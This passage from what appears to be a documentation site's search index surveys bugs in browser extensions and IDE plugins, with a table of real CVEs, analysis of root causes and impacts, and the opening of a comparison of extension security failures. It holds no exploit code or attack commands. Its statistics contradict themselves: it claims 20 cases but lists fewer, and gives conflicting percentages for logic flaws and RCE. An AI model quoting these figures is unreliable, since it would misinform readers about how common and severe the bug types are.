<li>Regular Audits &amp; Fast Patch Cycles: Extension ecosystems demand rapid patch deployment, especially for widely used components. The studies show a pattern of \u201cemergency patches,\u201d sometimes within days, to fix critical extension bugs. Maintaining a structured vulnerability disclosure and update mechanism is key.  </li> <li>Monitor for Regressions: The Docker AuthZ bypass recurred due to a regression in code that had been previously patched. Relying on comprehensive regression tests\u2014particularly around security-critical logic\u2014can prevent reintroducing old flaws.  </li> <li>Secure Defaults &amp; Minimal Plugin Usage: Both end-users and platform vendors can reduce risk by installing only necessary extensions, ensuring secure defaults, and enforcing principle of least privilege.  </li> </ul>"},{"location":"bpftime/EIM/study/#conclusion","title":"Conclusion","text":"<p>Across browser/IDE, database/webserver, and hypervisor/container ecosystems, extensions expand functionality but also broaden the attack surface and failure modes. The collected bug studies reveal consistent patterns: logic flaws, missing validations, and memory-safety mistakes can yield remote compromise, data leaks, or system crashes. Many vulnerabilities manifest at high severity\u2014RCE or privilege escalation\u2014since plugins often run with access to the host\u2019s most sensitive operations.</p> <p>To mitigate these risks, maintainers and developers must apply rigorous security engineering to extensions as thoroughly as they do to core systems. This includes adopting safer coding practices (memory safety, validated inputs), systematically restricting plugin privileges, providing timely patches, and continuously auditing for newly introduced or regressed vulnerabilities. By following these guidelines, organizations can enjoy the benefits of extensibility while minimizing the associated security and reliability pitfalls.</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/study/browser-ide-bug-study/","title":"Study on Bugs in Browser Extensions and IDE Plugins","text":"<p>Browser extensions and IDE plugins greatly enhance functionality, but they can also introduce bugs ranging from security vulnerabilities to performance and compatibility issues. Below, we document 20 real-world cases of such bugs in a structured table, followed by an analysis of common patterns, impacts, and statistics.</p>"},{"location":"bpftime/EIM/study/browser-ide-bug-study/#case-studies-table","title":"Case Studies Table","text":"Bug ID / CVE Affected Software Bug Type Root Cause Impact on Host Resolution CVE-2019-16371 LastPass Password Manager extension (Chrome/Opera) (NVD - CVE-2019-16371) Security (Info Leak) Logic flaw in extension popup handling (cached credentials reused; failure to validate context) (NVD - CVE-2019-16371) Exposed credentials for the previously visited site to malicious websites (password leak) (LastPass patched a security vulnerability from the extensions generated on pop-up windows) Patched in LastPass v4.33.0 (fixed popup logic) (LastPass patched a security vulnerability from the extensions generated on pop-up windows) CVE-2018-6654 Grammarly extension (Chrome, Firefox) (NVD - CVE-2018-6654) Security (Auth Token Leak) Insufficient origin validation \u2013 extension exposed user authentication tokens to any website via API calls (NVD - CVE-2018-6654) Allowed any website to hijack Grammarly auth tokens (could access user documents) (Critical Flaw in Grammarly Spell Checker Could Let Attackers Steal ...) Fixed Feb 2, 2018 update (restricted token access) (NVD - CVE-2018-6654) CVE-2019-12592 Evernote Web Clipper extension (Chrome) (Evernote XSS extension flaw puts personal data of millions at risk | The Daily Swig) Security (Universal XSS) Coding logic error enabling Same-Origin Policy bypass \u2013 extension scripts in iframes weren\u2019t properly isolated (Evernote XSS extension flaw puts personal data of millions at risk | The Daily Swig) (Evernote XSS extension flaw puts personal data of millions at risk | The Daily Swig) Malicious sites could execute script in context of other sites (account data theft from 3rd-party sites) (Evernote XSS extension flaw puts personal data of millions at risk | The Daily Swig) Patched in v7.11.1 within 4 days of report (Evernote XSS extension flaw puts personal data of millions at risk | The Daily Swig) (Evernote XSS extension flaw puts personal data of millions at risk | The Daily Swig) CVE-2017-6753 Cisco WebEx Meeting extension (Chrome, Firefox on Windows) (NVD - CVE-2017-6753) Security (Remote Code Exec) Design defect \u2013 extension exposed a high-privilege native function without proper domain restriction (NVD - CVE-2017-6753) Visiting a malicious page could execute arbitrary code on the system with browser privileges (NVD - CVE-2017-6753) Updated to v1.0.12 with restricted access (Cisco patched the flaw) (NVD - CVE-2017-6753) (No CVE) Adblock Plus (and similar adblockers) v3.2 filter feature (Adblock Plus filter feature runs risk of malicious code exploit | The Daily Swig) (Adblock Plus filter feature runs risk of malicious code exploit | The Daily Swig) Security (Code Injection) Over-permissive filter $rewrite option \u2013 allowed filter list maintainer to inject arbitrary JS into webpages under certain conditions (Adblock Plus filter feature runs risk of malicious code exploit | The Daily Swig) Potential for malicious filters to run code on any site a user visits (e.g. steal logins, alter content) (Adblock Plus filter feature runs risk of malicious code exploit | The Daily Swig) (Adblock Plus filter feature runs risk of malicious code exploit | The Daily Swig) Removed the <code>$rewrite</code> feature entirely in next update (April 2019) (Potential vulnerability through the URL rewrite filter option | Adblock Plus and (a little) more) (Potential vulnerability through the URL rewrite filter option | Adblock Plus and (a little) more) CVE-2020-1171 VS Code \u2013 Python Extension (Microsoft) (NVD - cve-2020-1171) Security (Remote Code Exec) Unsafe loading of project configuration files on open \u2013 extension executed code from workspace config without validation (NVD - cve-2020-1171) Opening a malicious project could execute arbitrary code on the developer\u2019s machine (high-severity RCE) (NVD - cve-2020-1171) Patched by Microsoft in extension update (May 2020) (NVD - cve-2020-1171) (hardened config loading) CVE-2020-1192 VS Code \u2013 Python Extension (Jupyter support) (NVD - cve-2020-1192) Security (Remote Code Exec) Trusting Jupyter notebook workspace settings \u2013 a <code>.ipynb</code> file could contain hostile settings that get loaded/executed (NVD - cve-2020-1192) Opening a malicious notebook could run code on host (developer privileges) (NVD - cve-2020-1192) (NVD - cve-2020-1192) Patched by Microsoft (May 2020) \u2013 extension now sanitizes or prompts on notebook config (NVD - cve-2020-1192) CVE-2023-46944 VS Code \u2013 GitLens extension &lt;14.0.0 (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) Security (Arbitrary Code Exec) Insecure use of local Git configs \u2013 extension executed Git commands in workspace without sanitizing repository settings (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) (malicious repo config could inject commands) Opening a malicious Git repository in VS Code could execute OS commands (bypassing VS Code\u2019s Workspace Trust) (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) Fixed in GitLens v14.0.0 \u2013 updated to ignore or safely handle untrusted repo configs (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) (pending CVE) VS Code \u2013 GitLens extension (Hover Markdown) (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) Security (Arbitrary Code Exec) Improper Markdown handling \u2013 extension marked untrusted commit data as <code>isTrusted=true</code> and failed to sanitize CR/LF, allowing injection of <code>command:</code> links in hover text (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) Viewing a malicious commit message (hover tooltip) could inject VS Code commands, leading to code execution when clicked (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) Fixed in GitLens v14.0.0 \u2013 removed unsafe Markdown trust and filtered input (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) CVE-2023-36867 VS Code \u2013 GitHub Pull Requests extension &lt;0.66.2 (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) Security (Remote Code Exec) Markdown injection in issue/PR view \u2013 extension rendered untrusted content with <code>isTrusted</code>, allowing attacker markdown to include executable <code>command:</code> links (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) Viewing a poisoned GitHub issue or PR in VS Code could trigger local code execution (attacker could run VS Code commands remotely) (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) Patched in v0.66.2 (July 2023) \u2013 update sanitizes markdown and respects workspace trust (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) CVE-2024-37051 JetBrains IDEs \u2013 GitHub Integration Plugin (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog) (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog) Security (Token Leak) Inadequate content sanitization \u2013 malicious GitHub Pull Request content could embed references that caused the IDE\u2019s GitHub plugin to send OAuth tokens to an attacker\u2019s server (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog) (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog) Exposure of GitHub access token to third-party (could lead to compromise of code repositories) (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog) JetBrains patched plugin (June 2024) and removed vulnerable versions (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog) (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog); users had to update and revoke tokens (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog) CVE-2024-24941 JetBrains IntelliJ IDEA \u2013 Space plugin &lt;2023.3.3 (NVD - Results) Security (Sensitive Data Exposure) Over-broad permissions \u2013 Space (JetBrains) plugin sent an auth token to an unintended URL due to improper access control (NVD - Results) Potential leak of Space authentication token (could allow unauthorized access to Space services) (NVD - Results) Fixed in IntelliJ 2023.3.3 \u2013 Space plugin updated to restrict token usage (NVD - Results) (No ID) IntelliJ IDEA \u2013 Eclipse Interoperability Plugin (java - IntelliJ Idea Community Edition using excessive memory - Stack Overflow) Performance (Memory Leak) Resource mismanagement \u2013 plugin retained large objects when using the \u201cOpen Project\u201d dialog (did not free memory on project switch) (java - IntelliJ Idea Community Edition using excessive memory - Stack Overflow) Extreme memory bloat (IDE RAM usage grew &gt;2.7 GB, causing slowness/hangs) (java - IntelliJ Idea Community Edition using excessive memory - Stack Overflow) (java - IntelliJ Idea Community Edition using excessive memory - Stack Overflow) User workaround: disable/remove plugin (java - IntelliJ Idea Community Edition using excessive memory - Stack Overflow) (JetBrains later fixed the leak in an update per user reports) (No ID) IntelliJ IDEA \u2013 SonarLint Plugin 10.11 (Memory leak org.sonarlint.idea (10.11.0.79648) - IntelliJ Platform - Sonar Community) (Memory leak org.sonarlint.idea (10.11.0.79648) - IntelliJ Platform - Sonar Community) Performance (Memory Leak) Excessive indexing \u2013 plugin indexed generated/ignored files due to a logic oversight, accumulating unwanted data in memory (Memory leak org.sonarlint.idea (10.11.0.79648) - IntelliJ Platform - Sonar Community) Gradual memory exhaustion during coding sessions (IDE would slow down or crash if memory exceeded) (Memory leak org.sonarlint.idea (10.11.0.79648) - IntelliJ Platform - Sonar Community) (Memory leak org.sonarlint.idea (10.11.0.79648) - IntelliJ Platform - Sonar Community) Awaiting patch (identified by devs in Oct 2024) \u2013 workaround to exclude problematic folders (Memory leak org.sonarlint.idea (10.11.0.79648) - IntelliJ Platform - Sonar Community) (No ID) Eclipse IDE \u2013 PMD static analysis plugin 4.0 (Eclipse nearly-consistently crashes on startup when workspace contains PMD enabled projects \u00b7 Issue #148 \u00b7 pmd/pmd-eclipse-plugin \u00b7 GitHub) (Eclipse nearly-consistently crashes on startup when workspace contains PMD enabled projects \u00b7 Issue #148 \u00b7 pmd/pmd-eclipse-plugin \u00b7 GitHub) Logic Error (Race Condition) Timing issue on startup \u2013 if projects had PMD with external rulesets, the plugin initialization could deadlock or crash Eclipse (likely a threading/race bug) (Eclipse nearly-consistently crashes on startup when workspace contains PMD enabled projects \u00b7 Issue #148 \u00b7 pmd/pmd-eclipse-plugin \u00b7 GitHub) (Eclipse nearly-consistently crashes on startup when workspace contains PMD enabled projects \u00b7 Issue #148 \u00b7 pmd/pmd-eclipse-plugin \u00b7 GitHub) Eclipse would consistently crash or freeze during launch when certain PMD settings were enabled (required multiple restarts) (Eclipse nearly-consistently crashes on startup when workspace contains PMD enabled projects \u00b7 Issue #148 \u00b7 pmd/pmd-eclipse-plugin \u00b7 GitHub) (Eclipse nearly-consistently crashes on startup when workspace contains PMD enabled projects \u00b7 Issue #148 \u00b7 pmd/pmd-eclipse-plugin \u00b7 GitHub) Fixed in PMD plugin 4.26.0 \u2013 reworked startup sequence (users could disable PMD or close projects as a workaround) (Eclipse nearly-consistently crashes on startup when workspace contains PMD enabled projects \u00b7 Issue #148 \u00b7 pmd/pmd-eclipse-plugin \u00b7 GitHub) (No ID) Chrome \u2013 Web Scrobbler Extension v2.40 (High CPU usage at idle and continuously looping fetch for extensions::setIcon \u00b7 Issue #3789 \u00b7 web-scrobbler/web-scrobbler \u00b7 GitHub) (High CPU usage at idle and continuously looping fetch for extensions::setIcon \u00b7 Issue #3789 \u00b7 web-scrobbler/web-scrobbler \u00b7 GitHub) Performance (Infinite Loop) Logic bug in service worker \u2013 an icon-loading function repeatedly retried due to a programming error (infinite fetch loop in <code>extensions::setIcon</code>) (High CPU usage at idle and continuously looping fetch for extensions::setIcon \u00b7 Issue #3789 \u00b7 web-scrobbler/web-scrobbler \u00b7 GitHub) 100% CPU usage continuously by the extension\u2019s background process, causing browser slowdown and high power consumption (High CPU usage at idle and continuously looping fetch for extensions::setIcon \u00b7 Issue #3789 \u00b7 web-scrobbler/web-scrobbler \u00b7 GitHub) (High CPU usage at idle and continuously looping fetch for extensions::setIcon \u00b7 Issue #3789 \u00b7 web-scrobbler/web-scrobbler \u00b7 GitHub) Fixed in subsequent release \u2013 developers resolved the loop condition (users could disable extension to stop the CPU drain) (High CPU usage at idle and continuously looping fetch for extensions::setIcon \u00b7 Issue #3789 \u00b7 web-scrobbler/web-scrobbler \u00b7 GitHub) (High CPU usage at idle and continuously looping fetch for extensions::setIcon \u00b7 Issue #3789 \u00b7 web-scrobbler/web-scrobbler \u00b7 GitHub) (No ID) Android Studio 4.1 \u2013 Third-party Plugin (e.g. old Android Drawable Importer) (Android Studio 4.1 Plugin Error: Plugin * is incompatible (supported only in IntelliJ IDEA) - Stack Overflow) Compatibility (Unsupported Plugin API) Outdated plugin not updated for new IDE \u2013 API changes made the plugin incompatible (manifest flagged \u201cIntelliJ only\u201d) (Android Studio 4.1 Plugin Error: Plugin * is incompatible (supported only in IntelliJ IDEA) - Stack Overflow) Plugin failed to load, causing error pop-ups at IDE startup; functionality provided by that plugin was unavailable (Android Studio 4.1 Plugin Error: Plugin * is incompatible (supported only in IntelliJ IDEA) - Stack Overflow) (Android Studio 4.1 Plugin Error: Plugin * is incompatible (supported only in IntelliJ IDEA) - Stack Overflow) Remove or update plugin \u2013 users had to manually delete it since the IDE disabled listing it (Android Studio 4.1 Plugin Error: Plugin * is incompatible (supported only in IntelliJ IDEA) - Stack Overflow) (plugin developer later released an update to restore compatibility) CVE-2024-0740 Eclipse IDE \u2013 Terminal &amp; RSE plugin &lt;=4.5.400 (NVD - CVE-2024-0740) Security (Remote Code Exec) Missing authentication on a service \u2013 the Remote System Explorer exposed a network-accessible functionality without auth, allowing arbitrary commands/actions (NVD - CVE-2024-0740) Critical RCE: An attacker could remotely execute code on the developer\u2019s machine without user interaction (network attack vector) (NVD - CVE-2024-0740) Fixed in Eclipse 2024-03 release \u2013 RSE plugin patched to require authentication or disabled vulnerable service (NVD - CVE-2024-0740) (NVD - CVE-2024-0740) <p>Table: Real-world bugs in browser extensions and IDE plugins, with their type, causes, impacts, and resolutions. Each case is referenced by a public report, CVE, or developer discussion.</p>"},{"location":"bpftime/EIM/study/browser-ide-bug-study/#analysis-of-patterns-and-impacts","title":"Analysis of Patterns and Impacts","text":""},{"location":"bpftime/EIM/study/browser-ide-bug-study/#common-patterns-root-causes","title":"Common Patterns &amp; Root Causes","text":"<p>From the diverse cases above, clear patterns emerge in the root causes of extension and plugin bugs:</p> <ul> <li> <p>Insufficient Privilege Isolation or Input Validation: Many security vulnerabilities stem from logic flaws where extensions/plugins do not properly validate origins or content. For example, LastPass and Grammarly\u2019s extensions failed to verify the context of requests, allowing unauthorized data access (NVD - CVE-2019-16371) (NVD - CVE-2018-6654). Evernote\u2019s Web Clipper had a universal XSS issue due to improper domain isolation (Evernote XSS extension flaw puts personal data of millions at risk | The Daily Swig), and Cisco\u2019s WebEx extension exposed a high-privilege function to all websites (design oversight) (NVD - CVE-2017-6753). In IDE plugins, similar mistakes occurred: VS Code\u2019s GitLens and GitHub PR extensions trusted unfiltered user content (commit messages, markdown) as safe, leading to command injection (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar) (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar). These cases show a trend of extensions/plugins over-trusting inputs (web page data, repository files, etc.) without adequate checks.</p> </li> <li> <p>Over-Permissive Features: Some bugs are introduced by powerful features that weren\u2019t sufficiently restricted. Adblock Plus\u2019s <code>$rewrite</code> filter option is a prime example \u2013 it was meant to enhance ad blocking, but it inadvertently allowed script injection because it was too permissive (Adblock Plus filter feature runs risk of malicious code exploit | The Daily Swig). Similarly, the JetBrains GitHub plugin\u2019s handling of pull request content was powerful (auto-fetching PR data) but didn\u2019t restrict outgoing requests, resulting in a token leak (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog). In these cases, the root cause is a failure to enforce principle of least privilege or to sandbox what a feature can do.</p> </li> <li> <p>Memory and Resource Management Bugs: A number of non-security bugs trace back to how extensions or plugins manage memory and processes. Memory leaks are recurrent \u2013 e.g., IntelliJ\u2019s Eclipse Interop and SonarLint plugins each forgot to release certain resources, causing memory usage to grow continuously (java - IntelliJ Idea Community Edition using excessive memory - Stack Overflow) (Memory leak org.sonarlint.idea (10.11.0.79648) - IntelliJ Platform - Sonar Community). The Web Scrobbler Chrome extension and the Eclipse PMD plugin each had infinite loops or deadlocks due to logic errors (retrying an operation endlessly, or getting stuck during initialization) (High CPU usage at idle and continuously looping fetch for extensions::setIcon \u00b7 Issue #3789 \u00b7 web-scrobbler/web-scrobbler \u00b7 GitHub) (Eclipse nearly-consistently crashes on startup when workspace contains PMD enabled projects \u00b7 Issue #148 \u00b7 pmd/pmd-eclipse-plugin \u00b7 GitHub). These patterns point to issues in event handling and cleanup \u2013 e.g., not breaking out of a retry loop, not unregistering listeners, or poor thread synchronization.</p> </li> <li> <p>Race Conditions and Concurrency Issues: Especially in IDE plugins, which often run multi-threaded, timing issues can cause bugs. The Eclipse PMD plugin\u2019s crash on startup suggests a race condition during plugin startup (likely two processes interacting out-of-order) (Eclipse nearly-consistently crashes on startup when workspace contains PMD enabled projects \u00b7 Issue #148 \u00b7 pmd/pmd-eclipse-plugin \u00b7 GitHub). Race conditions can also lead to security issues (as seen in some platform bugs, though not explicitly in our list) or to inconsistent behavior. Proper locking, sequencing, or using provided IDE thread models can prevent these, but plugin developers sometimes misuse them.</p> </li> <li> <p>Compatibility and API Misuse: Some bugs arise simply because a plugin wasn\u2019t updated for a host software change. For instance, after Android Studio updated, an older plugin became incompatible and caused errors until removed (Android Studio 4.1 Plugin Error: Plugin * is incompatible (supported only in IntelliJ IDEA) - Stack Overflow) This is not a flaw in the plugin\u2019s original logic, but a maintainability issue \u2013 relying on internal or outdated APIs. It highlights that plugins tightly coupled to IDE internals can break with updates. Additionally, misuse of an API (e.g., calling an unsafe method or using a debug mode incorrectly) can lead to vulnerabilities, as in the VS Code Python extension loading untrusted config \u2013 effectively an API misuse where untrusted files were treated as config code (NVD - cve-2020-1171).</p> </li> </ul> <p>In summary, logic errors (especially those involving trust boundaries and input handling) are the most prevalent root cause for serious bugs, particularly security bugs. Memory and performance issues often come from resource mismanagement (loops, leaks, indexing too much), while compatibility issues stem from plugins not following stable API practices.</p>"},{"location":"bpftime/EIM/study/browser-ide-bug-study/#impact-on-stability-maintainability-and-security","title":"Impact on Stability, Maintainability, and Security","text":"<p>Bugs in extensions and plugins can significantly affect both the host application and the user:</p> <ul> <li> <p>System Security: The most severe impact is remote code execution or data breach. About half of the documented cases are critical security vulnerabilities that allow an attacker to take control of the system or steal sensitive data. For example, WebEx\u2019s extension bug and VS Code\u2019s various extension bugs enabled remote code execution (RCE) \u2013 meaning an attacker could run arbitrary code on the user\u2019s machine just by them having an extension installed and visiting or opening malicious content (NVD - CVE-2017-6753) (Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3) | Sonar). Similarly, token leaks (Grammarly, JetBrains GitHub plugin) jeopardized account security by exposing credentials (NVD - CVE-2018-6654) (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog). These vulnerabilities undermine the security sandbox expectations of browsers and IDEs, effectively turning helpful add-ons into attack vectors. A compromised extension or plugin can negate other security measures: for instance, a browser extension with a sandbox escape can bypass web security, and an IDE plugin RCE can bypass developer workstation security. Thus, such bugs have high severity \u2013 requiring immediate patches and sometimes emergency revocations of extensions.</p> </li> <li> <p>Application Stability and Performance: Non-security bugs can degrade the user experience and even lead to data loss. Memory leaks and infinite loops in extensions often cause browser slowdowns, high CPU usage, or crashes. In our cases, the Web Scrobbler bug pegged a CPU core, making the browser sluggish (High CPU usage at idle and continuously looping fetch for extensions::setIcon \u00b7 Issue #3789 \u00b7 web-scrobbler/web-scrobbler \u00b7 GitHub), and memory leaks in IntelliJ plugins led to the IDE becoming unresponsive or crashing if the user didn\u2019t notice the growing memory footprint (java - IntelliJ Idea Community Edition using excessive memory - Stack Overflow) (Memory leak org.sonarlint.idea (10.11.0.79648) - IntelliJ Platform - Sonar Community). Crashes and freezes (like Eclipse with the PMD plugin issue (Eclipse nearly-consistently crashes on startup when workspace contains PMD enabled projects \u00b7 Issue #148 \u00b7 pmd/pmd-eclipse-plugin \u00b7 GitHub)) interrupt work and risk losing unsaved progress. Even if no crash occurs, performance bugs (e.g. heavy background indexing) can significantly slow down developer workflows, reducing productivity. Compatibility issues, where a plugin is disabled due to incompatibility, can also disrupt workflows by removing expected functionality until fixed. In terms of maintainability, frequent crashes or issues caused by plugins make the overall system harder to maintain and trust \u2013 users may need to disable extensions to get a stable experience, defeating the purpose of extensibility.</p> </li> <li> <p>System and Data Integrity: Some logic bugs can corrupt data or functionality without being security issues. For example, a flawed tab manager extension (like the OneTab issue, not formally listed above) can cause data loss \u2013 users have reported losing all their saved tabs due to such bugs (which is a logic/storage bug in the extension\u2019s design). Likewise, an IDE plugin that mishandles file I/O could corrupt project files. While none of our 20 cases explicitly involved data corruption, the risk is real in poorly designed extensions. This affects the reliability of the software environment \u2013 users might lose confidence in using certain plugins if they fear crashes or data loss.</p> </li> <li> <p>Maintainability: Each extension or plugin bug adds maintenance overhead for both developers and users. Extension developers must issue patches (sometimes under tight timelines, as seen with Evernote\u2019s 4-day turnaround (Evernote XSS extension flaw puts personal data of millions at risk | The Daily Swig)), and IDE vendors may need to implement stop-gaps (e.g., JetBrains coordinating with GitHub to mitigate the token leak by disabling older plugin versions remotely (Updates for security issue affecting IntelliJ-based IDEs 2023.1+ and JetBrains GitHub Plugin | The Security Blog)). For users, maintainability issues manifest as needing to keep extensions up-to-date, or temporarily remove them, to keep the system stable and secure. The Android Studio plugin incompatibility is a maintainability red flag \u2013 it required manual deletion of plugin files by the user (Android Studio 4.1 Plugin Error: Plugin * is incompatible (supported only in IntelliJ IDEA) - Stack Overflow), which is not ideal. Overall, a high rate of bugs in extensions/plugins can make the ecosystem harder to maintain; it requires vigilant version management and sometimes architectural changes (for instance, browser makers introduced Manifest v3 partly to tighten extension security and performance). </p> </li> </ul>"},{"location":"bpftime/EIM/study/browser-ide-bug-study/#statistical-insights-frequency-and-severity-of-bug-types","title":"Statistical Insights: Frequency and Severity of Bug Types","text":"<p>Considering the gathered cases (20+ examples), we can draw some statistical insights:</p> <ul> <li> <p>Security vs General Bugs: Roughly 60% of our cases are security vulnerabilities, while 40% are general (logic, performance, compatibility) bugs. This skew is partly because security bugs are more publicly reported (CVE-tagged). In the wild, general bugs (like minor logic errors, UI glitches, slowdowns) are far more frequent \u2013 every large extension likely has multiple bug reports in its tracker. However, security bugs, though fewer in number, tend to be the most severe and get disproportionate attention due to their impact. Non-security bugs are common but often lower severity (with the exception of those causing crashes or data loss).</p> </li> <li> <p>Most Frequent Bug Types: Logic errors are the most frequent if we include both security and non-security categories. These include flaws in flow or conditions (e.g., failing to call a function, incorrect conditions leading to leaks, infinite loops). In our sample, logic/design flaws enabled 100% of the security issues (none were due to, say, low-level memory corruption, since browser/IDE extensions are usually managed code). They also caused issues like the Web Scrobbler loop and PMD race condition. Performance issues (like memory leaks) are also fairly common in plugin development \u2013 we identified multiple leaks. Compatibility issues occur regularly around major releases but typically are transient (plugins get updated). </p> </li> <li> <p>Most Severe Bug Types: By severity, Remote Code Execution (RCE) and credential leaks rank highest. In our list, about 8 out of 20 cases allow for RCE under certain conditions (that\u2019s 40% of cases, all security-related). These are critical because they can fully compromise a system or user account. Following RCE, universal XSS/data injection (like the Evernote and Adblock Plus cases) are also severe, as they can lead to session theft and user impersonation. Among general bugs, those causing application crashes or hang-ups can be considered high severity in terms of stability (though not in the security sense). A memory leak that consistently crashes an IDE after a few hours is severe for reliability. Lower on the severity scale are compatibility issues that disable a plugin (annoying but usually do not harm data) and minor logic bugs that perhaps cause a feature not to work correctly without broader side effects.</p> </li> <li> <p>Distribution by Root Cause: An interesting observation is that 90%+ of the security bugs were due to logic/design flaws in how extensions handled data or privileges, versus something like memory corruption. This aligns with the technology: browser extensions (in Chrome/Firefox) are written in JS and operate at a high level, so memory safety issues are rare \u2013 logic bugs dominate. In contrast, memory leaks and performance issues often come from memory management and event-loop handling. We saw two cases of infinite loops and two of memory leaks, indicating these are recurring pain points. A broader study (outside this sample) would likely find that memory leaks and UI freezes are among the most reported general issues in large IDE plugins.</p> </li> <li> <p>Cross-Environment Issues: Some bug types span both browser extensions and IDE plugins. For example, infinite loops or high-CPU issues can happen in a Chrome extension content script or a VS Code extension\u2019s process just as easily. Credential leaks were seen in a web context (Grammarly\u2019s web token) and in an IDE context (JetBrains token). This suggests a common challenge: any extension/plugin that handles credentials or sensitive data must be very careful, regardless of platform. On the other hand, exploits via content (Markdown/HTML) are more of an issue in IDE extensions now (due to features like previewing markdown, or rendering diffs in tooltips) \u2013 something that traditionally was a concern in browsers (XSS) has analogues in IDEs (malicious README files or commit messages causing trouble).</p> </li> <li> <p>Quantitative Summary: In this case set, security vulnerabilities typically scored high on CVSS (many 8.0+ HIGH or even 9.8 CRITICAL (NVD - CVE-2024-0740)). General bugs don\u2019t have such scoring, but we can rate them qualitatively: about 5 out of 8 general issues caused serious performance degradation or crashes (which we can call \u201chigh impact\u201d for users). Compatibility issues (2 of the 8 general) are moderate impact (feature loss). So roughly, ~25% of all cases are critical RCE-level issues, another 30-35% are high-severity info leaks or crashes, and the rest are moderate or low severity. </p> </li> <li> <p>Ecosystem Trends: Statistically, browser extension ecosystems have seen a lot of permission misuse and XSS issues. A 2018 study, for instance, found that a significant portion of Chrome extension vulnerabilities were due to DOM manipulation and message-passing issues (not in our citations, but known in industry). For IDE plugins, recent disclosures (like those by SonarSource and Trail of Bits) show a trend of workspace attack vectors \u2013 malicious project files exploiting trust, as reflected in our VS Code cases. Performance-wise, modern IDEs often warn about slow plugins; data from JetBrains indicates plugins like those for complex language support (e.g., Python, Java) sometimes cause performance complaints, which matches our memory leak findings. </p> </li> </ul> <p>In conclusion, security bugs, though less frequent than minor logic bugs, are the most critical issues in extensions and plugins. They often trace back to common patterns (lack of proper validations, over-broad privileges) which can be mitigated by more cautious design (e.g., content security policies, asking for user permission, respecting \u201ctrusted workspace\u201d settings). General bugs like memory leaks and performance problems are more routinely encountered; they emphasize the need for testing extensions/plugins under real-world workloads and following best practices for resource management. Compatibility problems remind us that extension and plugin developers must keep pace with host application evolution, or risk breakage. </p> <p>Overall, the extension/plugin model provides great flexibility at the cost of expanding the attack surface and potential for errors. By identifying these patterns and their impacts, both users and developers can better understand the risks and focus on prevention \u2013 for example, users should limit extensions to those they trust and need, and developers should rigorously audit any feature that interacts with external content or system resources. </p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/study/compare/","title":"Extension Systems compare with EIM","text":""},{"location":"bpftime/EIM/study/compare/#1-case-studies-of-extension-security-failures","title":"1. Case Studies of Extension Security Failures","text":"<p>Overview: Software extensions (plugins, add-ons, modules) greatly extend functionality but can introduce serious security risks if not tightly controlled. Historically, loosely controlled extension models have led to vulnerabilities like buffer overflows, sandbox escapes, and privilege escalations. Below, we examine notable incidents and how a stricter model (like EIM \u2013 an Extension Isolation Mechanism) could have mitigated them. A comparative table at the end of this section summarizes these cases and EIM\u2019s potential impact.</p>"},{"location":"bpftime/EIM/study/compare/#11-buffer-overflow-vulnerabilities-in-extensions","title":"1.1 Buffer Overflow Vulnerabilities in Extensions","text":"<ul> <li> <p>ActiveX Controls (Internet Explorer): Microsoft\u2019s ActiveX allowed native code extensions in the browser with minimal restriction. Many ActiveX controls were marked \u201csafe for scripting\u201d (accessible to websites) and contained memory safety bugs. For example, the Windows Troubleshooter ActiveX control had a buffer overflow that let attackers execute arbitrary code by luring a user to a malicious web page (Microsoft Security Bulletin MS03-042 - Critical | Microsoft Learn). Because ActiveX had full system access, exploiting this overflow gave the attacker the user\u2019s privileges (or higher, if the user was admin). This lack of memory safety and sandboxing made ActiveX extensions notorious for remote code execution (RCE) exploits.</p> </li> <li> <p>Adobe Acrobat Reader Plug-ins: Early browser plug-in models (NPAPI) similarly allowed native code with full privileges. Incidents like the Adobe Acrobat ActiveX Buffer Overflow (CVE-2007-5659) let malicious PDFs trigger an overflow in a browser plug-in, leading to code execution (IBM Tivoli ActiveX Buffer Overflow (April 20, 2012) - SonicWall) (Yahoo! Audio Conferencing ActiveX control vulnerable to buffer ...). These cases highlight how memory unsafe extension 